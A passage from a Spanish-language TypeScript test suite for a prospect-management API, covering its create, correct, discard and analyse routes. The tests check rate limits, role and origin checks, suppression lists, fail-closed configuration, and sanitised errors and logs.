  it("bloquea la solicitud 31 por admin con 429 y Retry-After", async () => {
    for (let i = 0; i < 30; i += 1) {
      expect(
        rateLimitDetalle("propuestas:user_1", 30, 60_000).permitido,
      ).toBe(true)
    }

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(429)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("RATE_LIMIT")
    expect(Number(res.headers.get("retry-after"))).toBeGreaterThanOrEqual(1)
    expect(mocks.campanaFindUnique).not.toHaveBeenCalled()
  })

  it("bloquea la solicitud 61 por IP con 429 y Retry-After", async () => {
    for (let i = 0; i < 60; i += 1) {
      expect(
        rateLimitDetalle(`propuestas:ip:${IP}`, 60, 60_000).permitido,
      ).toBe(true)
    }

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(429)
    expect((await jsonDe(res)).codigo).toBe("RATE_LIMIT")
    expect(Number(res.headers.get("retry-after"))).toBeGreaterThanOrEqual(1)
  })
})

describe("POST /api/propuestas/prospectos - errores de infraestructura (AC-13)", () => {
  it("P2021 al leer la campana responde 503 ESQUEMA_NO_APLICADO", async () => {
    mocks.campanaFindUnique.mockRejectedValueOnce({ code: "P2021" })

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(503)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({
      codigo: "ESQUEMA_NO_APLICADO",
    })
    expect(mocks.prospectoCreate).not.toHaveBeenCalled()
  })

  it("P2002 al crear responde 409 ESTADO sin duplicar", async () => {
    mocks.prospectoCreate.mockRejectedValueOnce({ code: "P2002" })

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(409)
    expect((await jsonDe(res)).codigo).toBe("ESTADO")
  })

  it("error inesperado responde 500 sanitizado y loguea solo codigo/admin", async () => {
    mocks.campanaFindUnique.mockRejectedValueOnce(
      new Error(
        "fallo de Prisma con juan@example.com en https://interno.test/db?token=secreto",
      ),
    )

    const res = await crearProspecto(pedidoAlta())

    expect(res.status).toBe(500)
    esperarNoStore(res)
    const json = await jsonDe(res)
    expect(json).toMatchObject({ codigo: "DESCONOCIDO" })
    expect(json.error).toBe("Error inesperado.")
    const crudo = JSON.stringify(json)
    expect(crudo).not.toContain("juan@example.com")
    expect(crudo).not.toContain("interno.test")
    expect(crudo).not.toContain("Prisma")

    expect(mocks.loggerError).toHaveBeenCalledTimes(1)
    expect(mocks.loggerError.mock.calls[0][1]).toEqual({
      codigo: "DESCONOCIDO",
      adminId: "user_1",
    })
    const crudoLogs = JSON.stringify(mocks.loggerError.mock.calls)
    expect(crudoLogs).not.toContain("juan@example.com")
    expect(crudoLogs).not.toContain("interno.test")
  })
})

/* ------------------------------------------------------------------ */
/* T-14 (AC-13, AC-14, AC-19): PATCH /api/propuestas/prospectos/[id]    */
/* ------------------------------------------------------------------ */

describe("PATCH /api/propuestas/prospectos/[id] - correccion (AC-13, AC-19)", () => {
  function correccion(overrides: Record<string, unknown> = {}) {
    return {
      telefono: "+54 11 4444 0000",
      motivo: "Datos corregidos contra la web publicada por el negocio.",
      ...overrides,
    }
  }

  it("actualiza campos permitidos, recalcula el dominio y registra historial sin valores (AC-13)", async () => {
    configurarProspecto(
      prospectoBd({
        historial: [
          {
            accion: "CREACION",
            por: "user_1",
            en: "2026-11-10T00:00:00.000Z",
          },
        ],
      }),
    )

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        nombreNegocio: "Consultora Alfa SRL",
        sitioWeb: "https://www.beta.com.ar/contacto",
        email: "ventas@beta.com.ar",
        emailFuenteUrl: "https://beta.com.ar/contacto",
        telefono: "+54 11 4444 0000",
        ciudad: "Belgrano, CABA",
        rubro: "Contabilidad",
        contactoNombre: "Ana",
        contactoCargo: "Socia",
        fuenteUrl: "https://beta.com.ar/contacto",
        motivo: "Datos corregidos contra la web publicada por el negocio.",
        // Campos no permitidos: deben quedar ignorados.
        estado: "ENVIADO",
        campanaOrigenId: "otra_campana",
        score: 99,
      }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    esperarNoStore(res)
    await expect(jsonDe(res)).resolves.toEqual({
      id: "pros_1",
      estado: "NUEVO",
    })

    expect(mocks.prospectoUpdateMany).toHaveBeenCalledTimes(1)
    const args = primerArgumento(mocks.prospectoUpdateMany)
    expect(args.where).toEqual({
      id: "pros_1",
      estado: { not: "SUPRIMIDO" },
    })

    const data = (args.data ?? {}) as Record<string, unknown>
    expect(data).toMatchObject({
      nombreNegocio: "Consultora Alfa SRL",
      sitioWeb: "https://beta.com.ar/contacto",
      dominioNormalizado: "beta.com.ar",
      email: "ventas@beta.com.ar",
      emailFuenteUrl: "https://beta.com.ar/contacto",
      telefono: "+54 11 4444 0000",
      ciudad: "Belgrano, CABA",
      rubro: "Contabilidad",
      contactoNombre: "Ana",
      contactoCargo: "Socia",
      fuenteUrl: "https://beta.com.ar/contacto",
      actualizadoPor: "user_1",
      emailFechaFuente: expect.any(Date),
      ultimaInteraccionEn: expect.any(Date),
    })
    expect(data).not.toHaveProperty("estado")
    expect(data).not.toHaveProperty("campanaOrigenId")
    expect(data).not.toHaveProperty("score")
    expect(data).not.toHaveProperty("placeId")

    const historial = historialDe(data)
    expect(historial).toHaveLength(2)
    const ultima = historial[historial.length - 1]
    expect(ultima).toMatchObject({
      accion: "CORRECCION",
      por: "user_1",
      motivo: "Datos corregidos contra la web publicada por el negocio.",
      en: expect.any(String),
    })
    expect(ultima.campos).toEqual(
      expect.arrayContaining([
        "nombreNegocio",
        "sitioWeb",
        "email",
        "telefono",
        "ciudad",
        "rubro",
        "contactoNombre",
        "contactoCargo",
        "fuenteUrl",
        "emailFuenteUrl",
      ]),
    )

    const crudo = JSON.stringify(historial)
    expect(crudo).not.toContain("Consultora Alfa SRL")
    expect(crudo).not.toContain("ventas@beta.com.ar")
    expect(crudo).not.toContain("beta.com.ar")
    expect(crudo).not.toContain("4444")
    expect(crudo).not.toContain("https://")

    const crudoLogs = JSON.stringify(mocks.loggerInfo.mock.calls)
    expect(crudoLogs).not.toContain("Consultora Alfa SRL")
    expect(crudoLogs).not.toContain("ventas@beta.com.ar")
  })

  it("exige motivo y al menos un campo corregible (AC-13)", async () => {
    configurarProspecto()

    const sinMotivo = await corregirProspecto(
      pedidoCorreccion("pros_1", { telefono: "+54 11 4444 0000" }),
      contexto("pros_1"),
    )
    expect(sinMotivo.status).toBe(400)
    expect((await jsonDe(sinMotivo)).codigo).toBe("VALIDACION")

    const sinCampos = await corregirProspecto(
      pedidoCorreccion("pros_1", { motivo: "Solo el motivo." }),
      contexto("pros_1"),
    )
    expect(sinCampos.status).toBe(400)
    expect((await jsonDe(sinCampos)).codigo).toBe("VALIDACION")

    const campoVacio = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        nombreNegocio: "   ",
        motivo: "Sin dato nuevo.",
      }),
      contexto("pros_1"),
    )
    expect(campoVacio.status).toBe(400)
    expect((await jsonDe(campoVacio)).codigo).toBe("VALIDACION")

    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("rechaza la correccion de un prospecto SUPRIMIDO con 409 (AC-13)", async () => {
    configurarProspecto(prospectoBd({ estado: "SUPRIMIDO" }))

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", correccion()),
      contexto("pros_1"),
    )

    expect(res.status).toBe(409)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "SUPRIMIDO" })
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("exige fuente al cambiar el email y la acepta desde la fuente general (AC-19)", async () => {
    configurarProspecto(
      prospectoBd({ fuenteUrl: null, emailFuenteUrl: null }),
    )

    const sinFuente = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        email: "ventas@alfa.com.ar",
        motivo: "Email correcto publicado por el negocio.",
      }),
      contexto("pros_1"),
    )
    expect(sinFuente.status).toBe(400)
    expect((await jsonDe(sinFuente)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()

    const conFuenteGeneral = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        email: "ventas@alfa.com.ar",
        fuenteUrl: "https://alfa.com.ar/contacto",
        motivo: "Email correcto publicado por el negocio.",
      }),
      contexto("pros_1"),
    )
    expect(conFuenteGeneral.status).toBe(200)
    expect(
      ((primerArgumento(mocks.prospectoUpdateMany).data ?? {}) as Record<
        string,
        unknown
      >).email,
    ).toBe("ventas@alfa.com.ar")

    configurarProspecto(
      prospectoBd({ fuenteUrl: null, emailFuenteUrl: null }),
    )
    const conFuenteEmail = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        email: "ventas@alfa.com.ar",
        emailFuenteUrl: "https://alfa.com.ar/equipo",
        motivo: "Email correcto publicado por el negocio.",
      }),
      contexto("pros_1"),
    )
    expect(conFuenteEmail.status).toBe(200)
    expect(
      ((primerArgumento(mocks.prospectoUpdateMany).data ?? {}) as Record<
        string,
        unknown
      >).email,
    ).toBe("ventas@alfa.com.ar")
  })

  it("rechaza un email nuevo suprimido con 409 SUPRIMIDO (AC-15, AC-19)", async () => {
    configurarProspecto(
      prospectoBd({ emailFuenteUrl: "https://alfa.com.ar/contacto" }),
    )
    configurarSupresiones([
      {
        ambito: "EMAIL",
        emailHash: hashEmail("ventas@alfa.com.ar", SECRETO),
      },
    ])

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        email: "ventas@alfa.com.ar",
        motivo: "Email actualizado.",
      }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(409)
    expect((await jsonDe(res)).codigo).toBe("SUPRIMIDO")
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("sin PROPUESTAS_SECRETO al cambiar el email falla cerrado con 503 (AC-42)", async () => {
    configurarProspecto(
      prospectoBd({ emailFuenteUrl: "https://alfa.com.ar/contacto" }),
    )
    delete process.env.PROPUESTAS_SECRETO

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        email: "ventas@alfa.com.ar",
        motivo: "Email actualizado.",
      }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(503)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("NO_CONFIGURADO")
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("rechaza un email nuevo que ya pertenece a otro prospecto con 409 (AC-14)", async () => {
    configurarProspecto(
      prospectoBd({ emailFuenteUrl: "https://alfa.com.ar/contacto" }),
      "pros_otro",
    )

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        email: "ventas@alfa.com.ar",
        motivo: "Email actualizado.",
      }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(409)
    const json = await jsonDe(res)
    expect(json).toMatchObject({ codigo: "ESTADO" })
    expect(JSON.stringify(json)).not.toContain("pros_otro")
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("rechaza un sitio social o agregador con 400 VALIDACION (AC-19)", async () => {
    configurarProspecto()

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        sitioWeb: "https://www.instagram.com/consultora-alfa",
        motivo: "Sitio actualizado.",
      }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(400)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("VALIDACION")
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("responde 404 si el prospecto no existe (AC-13)", async () => {
    mocks.prospectoFindUnique.mockResolvedValue(null)

    const res = await corregirProspecto(
      pedidoCorreccion("pros_inexistente", correccion()),
      contexto("pros_inexistente"),
    )

    expect(res.status).toBe(404)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("NO_ENCONTRADO")
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })
})

describe("PATCH /api/propuestas/prospectos/[id] - auth, origen, rate y errores (AC-13)", () => {
  it("sin sesion 401 y asistente 403 sin tocar la base", async () => {
    mocks.auth.mockResolvedValue({ userId: null })
    const anonimo = await corregirProspecto(
      pedidoCorreccion("pros_1", { telefono: "+54 11 4444 0000", motivo: "x" }),
      contexto("pros_1"),
    )
    expect(anonimo.status).toBe(401)
    expect((await jsonDe(anonimo)).codigo).toBe("NO_AUTORIZADO")

    simularAdmin("asistente")
    const asistente = await corregirProspecto(
      pedidoCorreccion("pros_1", { telefono: "+54 11 4444 0000", motivo: "x" }),
      contexto("pros_1"),
    )
    expect(asistente.status).toBe(403)
    expect((await jsonDe(asistente)).codigo).toBe("PROHIBIDO")
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("rechaza origen ausente o cross-site con 403", async () => {
    for (const opciones of [
      { origin: null },
      { origin: "https://evil.example" },
    ]) {
      const res = await corregirProspecto(
        pedidoCorreccion(
          "pros_1",
          { telefono: "+54 11 4444 0000", motivo: "x" },
          opciones,
        ),
        contexto("pros_1"),
      )
      expect(res.status, JSON.stringify(opciones)).toBe(403)
      expect((await jsonDe(res)).codigo).toBe("ORIGEN_INVALIDO")
    }
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("bloquea con 429 al superar el rate limit por admin", async () => {
    for (let i = 0; i < 30; i += 1) {
      expect(
        rateLimitDetalle("propuestas:user_1", 30, 60_000).permitido,
      ).toBe(true)
    }

    const res = await corregirProspecto(
      pedidoCorreccion("pros_1", { telefono: "+54 11 4444 0000", motivo: "x" }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(429)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("RATE_LIMIT")
    expect(Number(res.headers.get("retry-after"))).toBeGreaterThanOrEqual(1)
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("P2002 responde 409; P2021 responde 503; error inesperado 500 sanitizado", async () => {
    configurarProspecto()
    mocks.prospectoUpdateMany.mockRejectedValueOnce({ code: "P2002" })

    const unico = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        telefono: "+54 11 4444 0000",
        motivo: "Correccion.",
      }),
      contexto("pros_1"),
    )
    expect(unico.status).toBe(409)
    expect((await jsonDe(unico)).codigo).toBe("ESTADO")

    configurarProspecto()
    mocks.prospectoUpdateMany.mockRejectedValueOnce({ code: "P2021" })
    const esquema = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        telefono: "+54 11 4444 0000",
        motivo: "Correccion.",
      }),
      contexto("pros_1"),
    )
    expect(esquema.status).toBe(503)
    expect((await jsonDe(esquema)).codigo).toBe("ESQUEMA_NO_APLICADO")

    configurarProspecto()
    mocks.prospectoUpdateMany.mockRejectedValueOnce(
      new Error("fallo juan@example.com https://interno.test/db"),
    )
    const inesperado = await corregirProspecto(
      pedidoCorreccion("pros_1", {
        telefono: "+54 11 4444 0000",
        motivo: "Correccion.",
      }),
      contexto("pros_1"),
    )
    expect(inesperado.status).toBe(500)
    esperarNoStore(inesperado)
    const json = await jsonDe(inesperado)
    expect(json.error).toBe("Error inesperado.")
    expect(JSON.stringify(json)).not.toContain("juan@example.com")
    expect(JSON.stringify(json)).not.toContain("interno.test")
    expect(mocks.loggerError.mock.calls[0][1]).toEqual({
      codigo: "DESCONOCIDO",
      adminId: "user_1",
    })
  })
})

/* ------------------------------------------------------------------ */
/* T-14 (AC-13): POST /api/propuestas/prospectos/[id]/descartar         */
/* ------------------------------------------------------------------ */

describe("POST /api/propuestas/prospectos/[id]/descartar (AC-13)", () => {
  const MOTIVO = "El negocio no encaja con el servicio ofrecido."

  it("descarta el prospecto, registra historial y cancela envios pendientes en una transaccion", async () => {
    configurarProspecto(
      prospectoBd({
        historial: [
          {
            accion: "CREACION",
            por: "user_1",
            en: "2026-11-10T00:00:00.000Z",
          },
        ],
      }),
    )

    const res = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    esperarNoStore(res)
    await expect(jsonDe(res)).resolves.toEqual({ estado: "DESCARTADO" })

    expect(mocks.transaction).toHaveBeenCalledTimes(1)
    expect(typeof mocks.transaction.mock.calls[0][0]).toBe("function")

    const argsProspecto = primerArgumento(mocks.tx.prospecto.updateMany)
    expect(argsProspecto.where).toEqual({
      id: "pros_1",
      estado: { notIn: ["SUPRIMIDO", "DESCARTADO"] },
    })
    const data = (argsProspecto.data ?? {}) as Record<string, unknown>
    expect(data).toMatchObject({
      estado: "DESCARTADO",
      actualizadoPor: "user_1",
      ultimaInteraccionEn: expect.any(Date),
    })
    const historial = historialDe(data)
    expect(historial).toHaveLength(2)
    expect(historial[historial.length - 1]).toMatchObject({
      accion: "DESCARTE",
      motivo: MOTIVO,
      por: "user_1",
      en: expect.any(String),
    })
    expect(JSON.stringify(historial)).not.toContain("https://")
    expect(JSON.stringify(historial)).not.toContain("contacto@alfa.com.ar")

    expect(mocks.tx.envioPropuesta.updateMany).toHaveBeenCalledWith({
      where: {
        prospectoId: "pros_1",
        estado: { in: ["BORRADOR", "APROBADO"] },
      },
      data: { estado: "CANCELADO", motivoCancelacion: MOTIVO },
    })

    const crudoLogs = JSON.stringify(mocks.loggerInfo.mock.calls)
    expect(crudoLogs).not.toContain("Consultora Alfa")
    expect(crudoLogs).not.toContain("contacto@alfa.com.ar")
  })

  it("exige un motivo no vacio y con maximo (AC-13)", async () => {
    configurarProspecto()

    for (const body of [
      {},
      { motivo: "   " },
      { motivo: "x".repeat(PROSPECTO_MOTIVO_MAX + 1) },
    ]) {
      const res = await descartarProspecto(
        pedidoDescarte("pros_1", body),
        contexto("pros_1"),
      )
      expect(res.status, JSON.stringify(body)).toBe(400)
      expect((await jsonDe(res)).codigo).toBe("VALIDACION")
    }

    expect(mocks.transaction).not.toHaveBeenCalled()
  })

  it("no permite descartar un prospecto SUPRIMIDO ni uno ya DESCARTADO (AC-13)", async () => {
    for (const estado of ["SUPRIMIDO", "DESCARTADO"]) {
      configurarProspecto(prospectoBd({ estado }))

      const res = await descartarProspecto(
        pedidoDescarte("pros_1", { motivo: MOTIVO }),
        contexto("pros_1"),
      )

      expect(res.status, estado).toBe(409)
      expect((await jsonDe(res)).codigo).toBe(
        estado === "SUPRIMIDO" ? "SUPRIMIDO" : "ESTADO",
      )
    }

    expect(mocks.transaction).not.toHaveBeenCalled()
  })

  it("responde 409 si la transicion atomica pierde la carrera", async () => {
    const fixture = prospectoBd()
    mocks.prospectoFindUnique
      .mockResolvedValueOnce({ ...fixture })
      .mockResolvedValueOnce({ id: "pros_1", estado: "DESCARTADO" })
    mocks.tx.prospecto.updateMany.mockResolvedValueOnce({ count: 0 })

    const res = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(409)
    expect((await jsonDe(res)).codigo).toBe("ESTADO")
    expect(mocks.tx.envioPropuesta.updateMany).not.toHaveBeenCalled()
  })

  it("responde 404 si el prospecto no existe (AC-13)", async () => {
    mocks.prospectoFindUnique.mockResolvedValue(null)

    const res = await descartarProspecto(
      pedidoDescarte("pros_inexistente", { motivo: MOTIVO }),
      contexto("pros_inexistente"),
    )

    expect(res.status).toBe(404)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("NO_ENCONTRADO")
    expect(mocks.transaction).not.toHaveBeenCalled()
  })

  it("sin sesion 401, asistente 403 y origen invalido 403 (AC-13)", async () => {
    mocks.auth.mockResolvedValue({ userId: null })
    const anonimo = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )
    expect(anonimo.status).toBe(401)

    simularAdmin("asistente")
    const asistente = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )
    expect(asistente.status).toBe(403)

    simularAdmin()
    const origen = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }, { origin: "https://evil.example" }),
      contexto("pros_1"),
    )
    expect(origen.status).toBe(403)
    expect((await jsonDe(origen)).codigo).toBe("ORIGEN_INVALIDO")

    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("bloquea con 429 al superar el rate limit por admin", async () => {
    for (let i = 0; i < 30; i += 1) {
      expect(
        rateLimitDetalle("propuestas:user_1", 30, 60_000).permitido,
      ).toBe(true)
    }

    const res = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )

    expect(res.status).toBe(429)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("RATE_LIMIT")
    expect(Number(res.headers.get("retry-after"))).toBeGreaterThanOrEqual(1)
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("P2021 responde 503 y un error inesperado 500 sanitizado (AC-13)", async () => {
    mocks.prospectoFindUnique.mockRejectedValueOnce({ code: "P2021" })
    const esquema = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )
    expect(esquema.status).toBe(503)
    expect((await jsonDe(esquema)).codigo).toBe("ESQUEMA_NO_APLICADO")

    configurarProspecto()
    mocks.transaction.mockRejectedValueOnce(
      new Error("fallo juan@example.com https://interno.test/db"),
    )
    const inesperado = await descartarProspecto(
      pedidoDescarte("pros_1", { motivo: MOTIVO }),
      contexto("pros_1"),
    )
    expect(inesperado.status).toBe(500)
    esperarNoStore(inesperado)
    const json = await jsonDe(inesperado)
    expect(json.error).toBe("Error inesperado.")
    expect(JSON.stringify(json)).not.toContain("juan@example.com")
    expect(JSON.stringify(json)).not.toContain("interno.test")
  })
})

/* ------------------------------------------------------------------ */
/* Aislamiento                                                          */
/* ------------------------------------------------------------------ */

describe("aislamiento del alta manual (AC-13, AC-19)", () => {
  it("las rutas no importan proveedores, no usan fetch ni tocan el CRM", () => {
    const rutas = [
      ["prospectos", "route.ts"],
      ["prospectos", "[id]", "route.ts"],
      ["prospectos", "[id]", "descartar", "route.ts"],
    ] as const

    for (const partes of rutas) {
      const fuente = readFileSync(
        join(process.cwd(), "src", "app", "api", "propuestas", ...partes),
        "utf8",
      )

      expect(fuente, partes.join("/")).not.toMatch(
        /from "@\/lib\/propuestas\/(places|web|resend|auditoria)"/,
      )
      expect(fuente, partes.join("/")).not.toMatch(/@\/lib\/resend/)
      expect(fuente, partes.join("/")).not.toMatch(
        /prisma\.(cliente|pago|suscripcion|enlacePago|proyecto|hito)\b/i,
      )
      expect(fuente, partes.join("/")).not.toMatch(
        /\bfetch\s*\(/,
      )
      expect(fuente, partes.join("/")).not.toMatch(/requireStaff|requireAdmin/)
    }
  })

  it("el alta y la correccion no llaman a la red ni a proveedores", async () => {
    await crearProspecto(pedidoAlta())

    configurarProspecto()
    await corregirProspecto(
      pedidoCorreccion("pros_1", {
        telefono: "+54 11 4444 0000",
        motivo: "Correccion.",
      }),
      contexto("pros_1"),
    )

    expect(fetchMock).not.toHaveBeenCalled()
  })
})

/* ------------------------------------------------------------------ */
/* T-15 (AC-9, AC-10, AC-19, AC-20, AC-21; RF-13..16, RF-31..33)      */
/* POST /api/propuestas/prospectos/[id]/analizar                       */
/* ------------------------------------------------------------------ */

describe("POST /api/propuestas/prospectos/[id]/analizar - enriquecimiento (AC-9, AC-10, AC-19)", () => {
  it("200: extrae email/telefono/nombre con fuentes, audita y puntua sin persistir HTML (AC-9, AC-10, AC-19, AC-21)", async () => {
    const fixture = prospectoAnalizable()
    configurarProspecto(fixture)

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    esperarNoStore(res)
    await expect(jsonDe(res)).resolves.toEqual({
      estado: "PUNTUADO",
      emailEncontrado: true,
      tieneEmail: true,
      auditoriaEstado: "OK",
      score: 88,
    })

    // NUEVO no salta a PUNTUADO: primero ENRIQUECIDO y despues PUNTUADO.
    const actualizaciones = actualizacionesProspecto()
    expect(actualizaciones).toHaveLength(2)
    expect(actualizaciones[0].where).toEqual({
      id: "pros_1",
      estado: { equals: "NUEVO", notIn: [...ESTADOS_NO_PISABLES] },
    })
    expect(actualizaciones[0].data).toMatchObject({
      estado: "ENRIQUECIDO",
      email: "ventas@alfa.com.ar",
      telefono: "+541155551234",
      nombreNegocio: "Consultora Alfa",
    })
    expect(actualizaciones[1].where).toEqual({
      id: "pros_1",
      estado: { equals: "ENRIQUECIDO", notIn: [...ESTADOS_NO_PISABLES] },
    })
    expect(actualizaciones[1].data).toMatchObject({
      estado: "PUNTUADO",
      score: 88,
    })

    // El fetch seguro recibe el sitio del prospecto y no el fetch global.
    expect(mocks.fetchHtmlSeguro).toHaveBeenCalledTimes(1)
    expect(mocks.fetchHtmlSeguro.mock.calls[0][0]).toBe(
      "https://alfa.com.ar/",
    )
    expect(fetchMock).not.toHaveBeenCalled()

    const data = await datosActualizados(2)
    expect(data).toMatchObject({
      estado: "PUNTUADO",
      motivoSinEnriquecer: null,
      nombreNegocio: "Consultora Alfa",
      email: "ventas@alfa.com.ar",
      emailFuenteUrl: "https://www.alfa.com.ar/",
      emailFechaFuente: expect.any(Date),
      telefono: "+541155551234",
      fuenteUrl: "https://www.alfa.com.ar/",
      fechaFuente: expect.any(Date),
      auditoriaEstado: "OK",
      auditoriaFecha: new Date("2026-11-12T15:30:00.000Z"),
      score: 88,
      actualizadoPor: "user_1",
      ultimaInteraccionEn: expect.any(Date),
    })

    expect(data.scoreDetalle).toMatchObject({
      total: 88,
      version: "v1",
    })
    expect(
      (data.scoreDetalle as { componentes: unknown[] }).componentes,
    ).toHaveLength(5)
    expect(data.auditoriaResumen).toEqual(auditoriaResumenOk())

    const crudoDatos = JSON.stringify(data)
    expect(crudoDatos).not.toContain(MARCADOR_HTML)
    expect(crudoDatos).not.toContain("<html")
    expect(crudoDatos).not.toContain("BEGIN CERTIFICATE")
    expect(crudoDatos).not.toContain("set-cookie")

    const crudoLogs = JSON.stringify(mocks.loggerInfo.mock.calls)
    expect(crudoLogs).not.toContain("ventas@alfa")
    expect(crudoLogs).not.toContain("Consultora Alfa")
    expect(crudoLogs).not.toContain("5555")
    expect(crudoLogs).not.toContain("alfa.com.ar")
    expect(crudoLogs).not.toContain(MARCADOR_HTML)
  })

  it("sin sitio web: SIN_ENRIQUECER/SIN_WEB sin fetch ni cupo y score con faltantes (AC-10, AC-21)", async () => {
    configurarProspecto(
      prospectoAnalizable({ sitioWeb: null, dominioNormalizado: null }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    await expect(jsonDe(res)).resolves.toEqual({
      estado: "SIN_ENRIQUECER",
      emailEncontrado: false,
      tieneEmail: false,
      auditoriaEstado: null,
      score: 20,
    })

    expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
    expect(mocks.reservarCupo).not.toHaveBeenCalled()
    expect(mocks.transaction).not.toHaveBeenCalled()
    expect(fetchMock).not.toHaveBeenCalled()

    const data = await datosActualizados()
    expect(data).toMatchObject({
      estado: "SIN_ENRIQUECER",
      motivoSinEnriquecer: "SIN_WEB",
      score: 20,
    })
    expect(data.scoreDetalle).toBeDefined()
  })

  it("suprime por email antes del fetch y no gasta red ni cupo (AC-15, AC-19)", async () => {
    configurarProspecto(
      prospectoAnalizable({ email: "contacto@alfa.com.ar" }),
    )
    configurarSupresiones([
      {
        ambito: "EMAIL",
        emailHash: hashEmail("contacto@alfa.com.ar", SECRETO),
      },
    ])

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    await expect(jsonDe(res)).resolves.toEqual({
      estado: "SUPRIMIDO",
      emailEncontrado: false,
      tieneEmail: true,
      auditoriaEstado: null,
      score: null,
    })

    expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
    expect(mocks.reservarCupo).not.toHaveBeenCalled()
    expect(fetchMock).not.toHaveBeenCalled()

    const data = await datosActualizados()
    expect(data).toMatchObject({
      estado: "SUPRIMIDO",
      // Un motivo de enriquecimiento viejo no sobrevive a la supresion.
      motivoSinEnriquecer: null,
      actualizadoPor: "user_1",
      ultimaInteraccionEn: expect.any(Date),
    })
    expect(data).not.toHaveProperty("email")
  })

  it("suprime por dominio antes del fetch aunque no haya email (AC-15, AC-19)", async () => {
    configurarProspecto(prospectoAnalizable({ email: null }))
    configurarSupresiones([
      { ambito: "DOMINIO", dominioNegocio: "alfa.com.ar" },
    ])

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "SUPRIMIDO",
      emailEncontrado: false,
      tieneEmail: false,
    })
    expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
    expect(mocks.reservarCupo).not.toHaveBeenCalled()

    const data = await datosActualizados()
    expect(data.motivoSinEnriquecer).toBeNull()
  })

  it("con email y sin PROPUESTAS_SECRETO falla cerrado 503 sin fetch (AC-42)", async () => {
    configurarProspecto(
      prospectoAnalizable({ email: "contacto@alfa.com.ar" }),
    )
    delete process.env.PROPUESTAS_SECRETO

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(503)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "NO_CONFIGURADO" })
    expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("sin email inicial y sin PROPUESTAS_SECRETO falla cerrado 503 sin persistir el email extraido (AC-42)", async () => {
    configurarProspecto(prospectoAnalizable({ email: null }))
    delete process.env.PROPUESTAS_SECRETO

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(503)
